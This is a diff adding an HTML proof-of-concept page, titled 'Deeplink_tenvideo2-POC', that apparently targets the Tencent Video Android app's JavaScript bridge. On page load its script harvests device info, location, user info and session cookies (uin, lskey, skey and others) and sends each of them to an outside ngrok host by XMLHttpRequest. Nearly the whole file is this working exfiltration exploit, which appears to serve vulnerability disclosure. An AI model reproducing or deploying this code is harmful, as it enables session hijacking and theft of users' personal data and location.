@@ -1,0 +1,121 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html;charset=utf8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <script type="text/javascript">
+ 
+        if (typeof TenvideoJSBridge == "object") {
+            callback();
+        }
+        else {
+            if (document.addEventListener) {
+                document.addEventListener("onTenvideoJSBridgeReady", callback, false);
+            } else if (document.attachEvent) {
+                document.attachEvent("onTenvideoJSBridgeReady", callback);
+            }
+        }
+        
+       
+       function callback() {
+            isTenvideoJSBridgeReady = true;
+            var res;
+            var device_info = function () {
+                TenvideoJSBridge.invoke('getDeviceInfo', null, function (ret) {
+                    var jret = JSON.parse(ret);
+                    alert(JSON.stringify(jret.result));
+                    res = JSON.stringify(jret.result);
+                    var xhttp = new XMLHttpRequest();
+                    xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                    };
+                    xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                    xhttp.send();
+                   });
+              }
+           device_info();
+
+         var location = function () {
+                TenvideoJSBridge.invoke('getLocation', null, function (ret) {
+                    var jret = JSON.parse(ret);
+                    alert("getLocation: " + JSON.stringify(jret.result));
+                    //printLog(ret);
+                    res = JSON.stringify(jret.result);
+                    var xhttp = new XMLHttpRequest();
+                    xhttp.onreadystatechange = function() {
+                   if (this.readyState == 4 && this.status == 200) {
+                  // Typical action to be performed when the document is ready:
+                   alert("DONE");
+                   }
+                  };
+                  xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                  xhttp.send();
+                });
+            }
+            location();
+
+        var addShortcut = function () {
+                TenvideoJSBridge.invoke('addShortcut', { "title": "Dhammu", "iconUrl": "https://www.w3schools.com/images/colorpicker.gif", "actionUrl": "txvideo://v.qq.com/Html5Activity?url=https%3A%2F%2Fiwan.qq.com%2Fm%2Fvadr%2Fhotgames.htm%3Fbusiness%3Dgame%26ADTAG%3Dtxsp.grzx-2.jdyx-1" }, function (ret) {
+                    console.log(ret);
+                    alert(ret);
+                    var jret = JSON.parse(ret);
+                });
+            }
+        //addShortcut();
+        
+        var old_getCookieValue =  function () {
+                alert(Android.getCookieValue('uin') + "\n"
+                    + Android.getCookieValue('luin') + '\n'
+                    + Android.getCookieValue('lskey') + '\n'
+                    + Android.getCookieValue('skey') + '\n'
+                    + Android.getCookieValue('nickname') + '\n'
+                );
+                var res = Android.getCookieValue('uin') + "\n"
+                    + Android.getCookieValue('luin') + '\n'
+                    + Android.getCookieValue('lskey') + '\n'
+                    + Android.getCookieValue('skey') + '\n'
+                    + Android.getCookieValue('nickname') + '\n';
+                var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                // Typical action to be performed when the document is ready:
+                alert("DONE");
+                }
+               };
+               xhttp.open("GET", "https://797b0cf2.ngrok.io/"+res, true);
+               xhttp.send();
+            }
+            old_getCookieValue();
+
+            var getSimpleMainUserInfo = function (type) {
+                TenvideoJSBridge.invoke('getSimpleMainUserInfo', null, function (ret) {
+                    var jret = JSON.parse(ret);
+                    alert(JSON.stringify(jret.result));
+                    var xhttp = new XMLHttpRequest();
+                     xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                    // Typical action to be performed when the document is ready:
+                    alert("DONE");
+                    }
+                 };
+                xhttp.open("GET", "https://797b0cf2.ngrok.io/"+JSON.stringify(jret.result), true);
+                xhttp.send();
+                });
+            }
+          getSimpleMainUserInfo();
+          TenvideoJSBridge.invoke("toast", { "content": "jsapi is ok!Loading prerfectly" });
+        }
+
+       </script>
+</head>
+
+<body>
+
+    <h1>Deeplink_tenvideo2-POC</h1>
+    
+</body>
+
+</html>
